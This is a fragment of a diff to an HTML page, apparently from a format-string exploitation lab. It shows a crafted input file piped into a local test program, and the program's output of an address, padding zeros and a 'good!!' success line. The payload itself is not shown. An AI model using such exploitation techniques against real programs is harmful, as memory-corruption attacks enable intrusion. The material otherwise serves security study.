+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="07656e6960736669606072666947726572697372">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ cat 11 | ./test 
 ����  bffff024         0         00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003good!!
-</code></pre>      </p>
+</code></pre>      <p></p>
     
 			</body>
 		</html>
